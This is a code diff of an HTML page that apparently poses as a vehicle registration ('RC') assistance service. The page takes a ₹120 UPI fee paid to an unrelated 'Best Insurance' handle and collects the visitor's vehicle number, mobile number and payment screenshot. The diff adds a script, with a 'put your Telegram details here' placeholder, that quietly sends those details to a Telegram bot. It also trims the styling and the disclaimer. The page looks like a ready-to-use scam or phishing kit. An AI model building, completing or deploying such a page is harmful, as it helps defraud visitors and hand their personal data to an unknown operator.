@@ -6,12 +6,7 @@
 <title>Vehicle Assistance Service</title>
 
 <style>
-*{
-box-sizing:border-box;
-margin:0;
-padding:0;
-font-family:Segoe UI,Arial;
-}
+*{box-sizing:border-box;margin:0;padding:0;font-family:Segoe UI,Arial;}
 
 body{
 min-height:100vh;
@@ -19,14 +14,16 @@ display:flex;
 flex-direction:column;
 justify-content:center;
 align-items:center;
-background:linear-gradient(135deg,#4facfe,#00f2fe);
+background:linear-gradient(-45deg,#4facfe,#00f2fe,#43e97b,#38f9d7);
+background-size:400% 400%;
+animation:gradientMove 10s ease infinite;
 padding:20px;
-animation:bgMove 8s ease infinite alternate;
 }
 
-@keyframes bgMove{
-0%{filter:brightness(1);}
-100%{filter:brightness(1.1);}
+@keyframes gradientMove{
+0%{background-position:0% 50%}
+50%{background-position:100% 50%}
+100%{background-position:0% 50%}
 }
 
 .card{
@@ -35,21 +32,11 @@ max-width:420px;
 background:white;
 border-radius:24px;
 padding:28px;
-box-shadow:0 20px 50px rgba(0,0,0,0.15);
+box-shadow:0 15px 40px rgba(0,0,0,0.2);
 text-align:center;
-animation:fadeIn .6s ease;
 }
 
-@keyframes fadeIn{
-from{opacity:0;transform:translateY(20px);}
-to{opacity:1;transform:translateY(0);}
-}
-
-h2{
-margin-bottom:18px;
-color:#1d2b64;
-font-weight:600;
-}
+h2{margin-bottom:18px;color:#1d2b64;}
 
 input,button{
 width:100%;
@@ -57,18 +44,9 @@ padding:15px;
 margin-top:14px;
 border-radius:14px;
 font-size:15px;
-transition:.3s;
 }
 
-input{
-border:1px solid #ddd;
-}
-
-input:focus{
-border-color:#4facfe;
-box-shadow:0 0 0 3px rgba(79,172,254,0.2);
-outline:none;
-}
+input{border:1px solid #ddd;}
 
 button{
 background:#1d2b64;
@@ -76,16 +54,6 @@ color:white;
 font-weight:600;
 border:none;
 cursor:pointer;
-box-shadow:0 8px 18px rgba(29,43,100,0.25);
-}
-
-button:hover{
-transform:translateY(-2px);
-box-shadow:0 12px 22px rgba(29,43,100,0.3);
-}
-
-button:active{
-transform:scale(.98);
 }
 
 img{
@@ -126,30 +94,15 @@ animation:spin 1s linear infinite;
 margin-bottom:20px;
 }
 
-@keyframes spin{
-to{transform:rotate(360deg);}
-}
+@keyframes spin{to{transform:rotate(360deg);}}
 
-/* Success animation */
-.successIcon{
-font-size:55px;
-animation:pop .4s ease;
-}
-
-@keyframes pop{
-from{transform:scale(0);}
-to{transform:scale(1);}
-}
-
-/* Footer */
 .footer{
 margin-top:30px;
 max-width:420px;
 text-align:center;
 font-size:13px;
-color:#222;
+color:white;
 line-height:1.7;
-opacity:0.9;
 }
 </style>
 </head>
@@ -163,12 +116,14 @@ opacity:0.9;
 
 <div class="card">
 
+<!-- PAGE 1 -->
 <div id="p1">
 <h2>Enter Vehicle Number</h2>
 <input id="vehicle" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatVehicle(this)">
 <button onclick="goPay()">Continue</button>
 </div>
 
+<!-- PAGE 2 -->
 <div id="p2" class="hidden">
 <h2>Service Fee ₹120</h2>
 
@@ -184,10 +139,10 @@ opacity:0.9;
 <button onclick="submitForm()">Submit</button>
 </div>
 
+<!-- PAGE 3 -->
 <div id="p3" class="hidden">
-<div class="successIcon">🎉</div>
-<h2>Congratulations!</h2>
-<p style="margin-top:12px;">
+<h2>🎉 Congratulations!</h2>
+<p>
 मुझे आपकी request मिल गई है।<br>
 हम जल्द ही आपसे संपर्क करेंगे।
 </p>
@@ -197,17 +152,16 @@ opacity:0.9;
 </div>
 
 <div class="footer">
-<b>About:</b><br>
-Independent Vehicle Assistance Platform<br><br>
-
-<b>Disclaimer:</b><br>
-This is a private service platform and not affiliated with any government authority.<br><br>
-
-© 2026 Mishra Service<br>
-Independent Digital Assistance Platform
+<b>About:</b> Independent Vehicle Assistance Platform<br>
+<b>Disclaimer:</b> Private service platform not affiliated with any government authority.<br>
+© 2026 Mishra Service
 </div>
 
 <script>
+
+// 🔴 PUT YOUR TELEGRAM DETAILS HERE
+const token = "YOUR_BOT_TOKEN";
+const chatId = "YOUR_CHAT_ID";
 
 function showLoader(text){
 document.getElementById("loaderText").innerHTML=text;
@@ -245,22 +199,43 @@ window.location.href="upi://pay?pa=bestinsurance@upi&pn=Best%20Insurance&am=120.
 }
 
 function submitForm(){
+
 if(mobile.value.length<10){
 alert("Enter valid mobile number");
 return;
 }
+
 if(!proof.files[0]){
 alert("Upload payment screenshot");
 return;
 }
 
-showLoader("आपकी request verify की जा रही है...<br>कृपया प्रतीक्षा करें");
+showLoader("आपकी request भेजी जा रही है...");
 
-setTimeout(()=>{
+let data = new FormData();
+data.append("chat_id", chatId);
+data.append("caption",
+`🚗 New RC Request
+
+Vehicle: ${vehicle.value}
+Mobile: ${mobile.value}`
+);
+data.append("photo", proof.files[0]);
+
+fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
+method:"POST",
+body:data
+})
+.then(res=>res.json())
+.then(()=>{
 hideLoader();
 p2.classList.add("hidden");
 p3.classList.remove("hidden");
-},2500);
+})
+.catch(()=>{
+hideLoader();
+alert("Submission failed. Try again.");
+});
 }
 
 function goHome(){
